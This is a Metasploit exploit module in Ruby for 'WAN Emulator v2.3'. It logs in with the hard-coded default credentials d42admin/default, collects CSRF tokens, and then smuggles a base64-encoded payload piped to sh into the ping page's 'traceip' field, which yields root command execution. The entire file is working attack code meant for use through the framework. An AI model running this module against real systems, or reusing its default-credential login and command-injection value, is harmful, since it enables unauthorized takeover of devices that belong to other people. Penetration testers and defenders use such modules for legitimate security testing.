##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WAN Emulator v2.3 Command Execution',
      'Description'    => %q{
      },
      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Author'         =>
        [
          'Brendan Coles <bcoles[at]gmail.com>', # Discovery and exploit
        ],
      'References'     =>
        [
        ],
      'Payload'        =>
        {
          'Space'       => 1024,
          'BadChars'    => "",
          'DisableNops' => true,
          #'Compat'      =>
          #  {
          #    'PayloadType' => 'cmd',
          #    'RequiredCmd' => 'generic netcat netcat-e',
          #  }
        },
      'DefaultOptions' =>
        {
          'ExitFunction' => 'none'
        },
      'Targets'        =>
        [
          ['Automatic Targeting', { 'auto' => true }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 12 2012'
    ))
  end

  def exploit
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'accounts', 'login/'),
    })

    cookie = res.headers['Set-Cookie']

    csrf = $1 if res.body =~ / name='csrfmiddlewaretoken' value='(.*)' \/><\/div>/

    post = {
      'csrfmiddlewaretoken' => csrf,
      'username' => 'd42admin',
      'password' => 'default',
      'next' => '/'
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'accounts', 'login/'),
      'vars_post' => post,
      'method' => 'POST',
      'cookie' => cookie
    })

    unless res.code == 302
      fail_with("auth failed")
    end

    cookie = res.headers['Set-Cookie']

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ping/'),
      'cookie' => cookie
    })

    cookie = res.headers['Set-Cookie']
    csrf = $1 if res.body =~ / name='csrfmiddlewaretoken' value='(.*)' \/><\/div>/

    post = {
      'csrfmiddlewaretoken' => csrf,
      'traceip' => "www.google.com`echo #{Rex::Text.encode_base64(payload.encoded)}|base64 --decode|sh`",
      'trace' => ''
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ping/'),
      'method' => "POST",
      'vars_post' => post,
      'cookie' => cookie
    })
  end
end
